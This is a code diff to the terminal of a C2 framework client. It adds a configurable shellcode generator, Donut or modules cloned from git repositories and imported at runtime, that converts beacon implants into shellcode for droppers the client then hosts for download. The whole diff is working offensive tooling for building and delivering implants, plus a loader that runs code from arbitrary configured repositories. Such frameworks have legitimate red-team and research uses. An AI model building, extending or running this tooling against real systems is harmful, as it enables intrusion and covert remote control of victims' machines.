@@ -74,11 +74,61 @@ for moduleName in os.listdir(dropperModulesDir):
             except ImportError as e:
                 print(f"Failed to import {moduleName}: {e}")
 
+#
+# ShellCode modules
+#
 
-#
-# Terminal modules
-#
-# legacy path setup removed in favor of package imports
+import donut
+
+try:
+    import pkg_resources
+    shellCodeModulesDir = pkg_resources.resource_filename(
+        'C2Client',  
+        'ShellCodeModules' 
+    )
+    ShellCodeModulesPath = pkg_resources.resource_filename(
+        'C2Client',  
+        'ShellCodeModules.conf'  
+    )
+
+except ImportError:
+    shellCodeModulesDir = os.path.join(os.path.dirname(__file__), 'ShellCodeModules')
+    ShellCodeModulesPath = os.path.join(os.path.dirname(__file__), 'ShellCodeModules.conf')
+
+if not os.path.exists(shellCodeModulesDir):
+    os.makedirs(shellCodeModulesDir)
+
+with open(ShellCodeModulesPath, "r") as file:
+    repositories = file.readlines()
+
+ShellCodeModules = []
+for repo in repositories:
+    repo = repo.strip()
+    repoName = repo.split('/')[-1].replace('.git', '')
+    repoPath = os.path.join(shellCodeModulesDir, repoName)
+
+    if not os.path.exists(repoPath):
+        print(f"Cloning {repoName} in {repoPath}.")
+        try:
+            Repo.clone_from(repo, repoPath)
+        except Exception as e:
+                print(f"Failed to clone {repoName}: {e}")
+    else:
+        print(f"Repository {repoName} already exists in {shellCodeModulesDir}.")
+
+for moduleName in os.listdir(shellCodeModulesDir):
+    modulePath = os.path.join(shellCodeModulesDir, moduleName)
+    
+    if os.path.isdir(modulePath):
+        if os.path.exists(modulePath):
+            sys.path.insert(1, modulePath)
+            try:
+                # Dynamically import the module
+                importedModule = __import__(moduleName)
+                ShellCodeModules.append(importedModule)
+                print(f"Successfully imported {moduleName}")
+            except ImportError as e:
+                print(f"Failed to import {moduleName}: {e}")
 
 
 #
@@ -137,6 +187,21 @@ exemple:
 - Batcave Search rec"""
 
 DropperInstruction = "Dropper"
+DropperConfigSubInstruction = "Config"
+DropperConfigShellcodeGeneratorDisplay = "ShellcodeGenerator"
+DropperConfigShellcodeGeneratorKey = DropperConfigShellcodeGeneratorDisplay.lower()
+ShellcodeGeneratorDonut = "Donut"
+DropperAvailableHeader = "- Available dropper:\n"
+DropperThreadRunningMessage = "Dropper thread already running"
+DropperConfigHeader = "- Dropper Config:"
+DropperConfigShellcodeGeneratorLine = f"  {DropperConfigShellcodeGeneratorDisplay}: {{}}"
+DropperConfigShellcodeGeneratorAvailableLine = "    Available: {}"
+DropperConfigUnknownOptionError = "Error: Unknown dropper config option."
+DropperConfigUnknownValueError = "Error: Unknown shellcode generator."
+DropperConfigUpdatedMessage = "Shellcode generator set to {}."
+DonutShellcodeGeneratorMessage = "Donut Shellcode generator"
+DonutShellcodeFileName = "loader.bin"
+ModuleShellcodeFileName = "finalShellcode.bin"
 
 DropperModuleGetHelpFunction = "getHelpExploration"
 DropperModuleGeneratePayloadFunction = "generatePayloadsExploration"
@@ -178,7 +243,11 @@ def getHelpMsg():
 completerData = [
     (HelpInstruction,[]),
     (HostInstruction,[]),
-    (DropperInstruction,[]),
+    (DropperInstruction,[
+            (DropperConfigSubInstruction, [
+                (DropperConfigShellcodeGeneratorDisplay, [])
+            ])
+        ]),
     (BatcaveInstruction, [
             ("Install", []),
             ("BundleInstall", []),
@@ -212,6 +281,7 @@ class Terminal(QWidget):
         self.layout.setContentsMargins(0, 0, 0, 0)
 
         self.grpcClient = grpcClient
+        self.dropperConfig = {DropperConfigShellcodeGeneratorKey: ShellcodeGeneratorDonut}
 
         self.logFileName=LogFileName
 
@@ -291,9 +361,10 @@ class Terminal(QWidget):
                     elif instructions[1].lower() == ReloadModulesInstruction.lower():
                         self.printInTerminal(commandLine, ReloadModulesHelp)
                     elif instructions[1].lower() == DropperInstruction.lower():
-                        availableModules = "- Available dropper:\n"
+                        availableModules = DropperAvailableHeader
                         for module in DropperModules:
                             availableModules += "  " + module.__name__ + "\n"
+                        availableModules += "\n" + self._format_shellcode_generator_summary()
                         self.printInTerminal(commandLine, availableModules)
                         return
                     elif instructions[1].lower() ==  SocksInstruction.lower():
@@ -554,18 +625,83 @@ class Terminal(QWidget):
         self.printInTerminal(commandLine, result)
 
 
+    def _handle_dropper_config(self, commandLine, instructions):
+        if len(instructions) == 2:
+            self.printInTerminal(commandLine, self._format_shellcode_generator_summary())
+            return
+
+        configKey = instructions[2].lower()
+        if configKey != DropperConfigShellcodeGeneratorKey:
+            self.printInTerminal(commandLine, DropperConfigUnknownOptionError)
+            return
+
+        if len(instructions) == 3:
+            self.printInTerminal(commandLine, self._format_shellcode_generator_summary(include_header=False))
+            return
+
+        requestedGenerator = instructions[3].lower()
+        availableGenerators = self._get_available_shellcode_generators()
+
+        selectedGenerator = None
+        for generator in availableGenerators:
+            if generator.lower() == requestedGenerator:
+                selectedGenerator = generator
+                break
+
+        if not selectedGenerator:
+            self.printInTerminal(commandLine, DropperConfigUnknownValueError)
+            return
+
+        self.dropperConfig[DropperConfigShellcodeGeneratorKey] = selectedGenerator
+        self.printInTerminal(commandLine, DropperConfigUpdatedMessage.format(selectedGenerator))
+
+    def _format_shellcode_generator_summary(self, include_header=True):
+        currentGenerator = self.dropperConfig.get(
+            DropperConfigShellcodeGeneratorKey,
+            ShellcodeGeneratorDonut,
+        )
+        availableGenerators = ", ".join(self._get_available_shellcode_generators())
+
+        lines = []
+        if include_header:
+            lines.append(DropperConfigHeader)
+            generatorLine = DropperConfigShellcodeGeneratorLine.format(currentGenerator)
+            availableLine = DropperConfigShellcodeGeneratorAvailableLine.format(availableGenerators)
+        else:
+            generatorLine = DropperConfigShellcodeGeneratorLine.strip().format(currentGenerator)
+            availableLine = DropperConfigShellcodeGeneratorAvailableLine.strip().format(availableGenerators)
+        lines.append(generatorLine)
+        lines.append(availableLine)
+        return "\n".join(lines)
+
+    def _get_available_shellcode_generators(self):
+        generators = [ShellcodeGeneratorDonut]
+        for module in ShellCodeModules:
+            moduleName = module.__name__
+            if moduleName not in generators:
+                generators.append(moduleName)
+        return generators
+
+
     #
-    # runDropper 
+    # runDropper
     #
     def runDropper(self, commandLine, instructions):
         if len(instructions) < 2:
-            availableModules = "- Available dropper:\n"
+            availableModules = DropperAvailableHeader
             for module in DropperModules:
                 availableModules += "  " + module.__name__ + "\n"
+            availableModules += "\n" + self._format_shellcode_generator_summary()
             self.printInTerminal(commandLine, availableModules)
             return
 
-        moduleName = instructions[1].lower()
+        subCommand = instructions[1].lower()
+
+        if subCommand == DropperConfigSubInstruction.lower():
+            self._handle_dropper_config(commandLine, instructions)
+            return
+
+        moduleName = subCommand
 
         moduleFound = False
         for module in DropperModules:
@@ -585,10 +721,22 @@ class Terminal(QWidget):
                 additionalArgss = " ".join(instructions[4:])
 
                 if self.dropperWorker:
-                    self.printInTerminal(commandLine, 'Dropper thread already running')
+                    self.printInTerminal(commandLine, DropperThreadRunningMessage)
                 else:
                     self.thread = QThread()
-                    self.dropperWorker = DropperWorker(self.grpcClient, commandLine, moduleName, listenerDownload, listenerBeacon, additionalArgss)
+                    shellcodeGenerator = self.dropperConfig.get(
+                        DropperConfigShellcodeGeneratorKey,
+                        ShellcodeGeneratorDonut,
+                    )
+                    self.dropperWorker = DropperWorker(
+                        self.grpcClient,
+                        commandLine,
+                        moduleName,
+                        listenerDownload,
+                        listenerBeacon,
+                        additionalArgss,
+                        shellcodeGenerator,
+                    )
                     self.dropperWorker.moveToThread(self.thread)
                     self.thread.started.connect(self.dropperWorker.run)
                     self.dropperWorker.finished.connect(self.printDropperResult)
@@ -617,7 +765,16 @@ class Terminal(QWidget):
 class DropperWorker(QObject):
     finished = pyqtSignal(str, str)
 
-    def __init__(self, grpcClient, commandLine, moduleName, listenerDownload, listenerBeacon, additionalArgs):
+    def __init__(
+        self,
+        grpcClient,
+        commandLine,
+        moduleName,
+        listenerDownload,
+        listenerBeacon,
+        additionalArgs,
+        shellcodeGenerator,
+    ):
         super().__init__()
         self.grpcClient = grpcClient
         self.commandLine = commandLine
@@ -625,6 +782,7 @@ class DropperWorker(QObject):
         self.listenerDownload = listenerDownload
         self.listenerBeacon = listenerBeacon
         self.additionalArgs = additionalArgs
+        self.shellcodeGenerator = shellcodeGenerator or ShellcodeGeneratorDonut
 
     def run(self):
 
@@ -718,9 +876,39 @@ class DropperWorker(QObject):
         cmdToRun = ""
         for module in DropperModules:
             if self.moduleName == module.__name__.lower():
-                logging.debug("GenerateAndHostGeneric Generate for module: %s", self.moduleName)
+                logging.debug("GenerateAndHostGeneric DropperModule: %s", self.moduleName)
+
+                shellcodeGenerator = self.shellcodeGenerator
+                shellcodeGeneratorLower = shellcodeGenerator.lower()
+                rawshellcode = ""
+
+                # Check shellcode generator
+                if shellcodeGeneratorLower == ShellcodeGeneratorDonut.lower():
+                    print(DonutShellcodeGeneratorMessage)
+                    shellcode = donut.create(
+                        file=beaconFilePath,
+                        params=beaconArg
+                    )
+                    beaconArg = ""
+                    beaconFilePath = ""
+                    rawshellcode = DonutShellcodeFileName
+
+                else:
+                    for ShellCodeModule in ShellCodeModules:
+                        logging.debug("ShellCodeModule: %s", ShellCodeModule)
+
+                        if shellcodeGeneratorLower == ShellCodeModule.__name__.lower():
+                            logging.debug("GenerateAndHostGeneric ShellCodeModule: %s", ShellCodeModule.__name__)
+
+                            genShellcode = getattr(ShellCodeModule, "buildLoaderShellcode")
+                            genShellcode(beaconFilePath, "", beaconArg, 3)
+
+                            beaconArg = ""
+                            beaconFilePath = ""
+                            rawshellcode = ModuleShellcodeFileName
+
                 genPayload = getattr(module, DropperModuleGeneratePayloadFunction)
-                droppersPath, shellcodesPath, cmdToRun = genPayload(beaconFilePath, beaconArg, "", urlDownload, self.additionalArgs.split(" "))
+                droppersPath, shellcodesPath, cmdToRun = genPayload(beaconFilePath, beaconArg, rawshellcode, urlDownload, self.additionalArgs.split(" "))
 
         # Upload the file and get the path
         for dropperPath in droppersPath:
@@ -813,7 +1001,7 @@ class CommandEditor(QLineEdit):
             self.setText(cmd.strip())
 
     def setCmdHistory(self):
-        cmdHistoryFile = open('.termHistory')
+        cmdHistoryFile = open(HistoryFileName)
         self.cmdHistory = cmdHistoryFile.readlines()
         self.idx=len(self.cmdHistory)-1
         cmdHistoryFile.close()
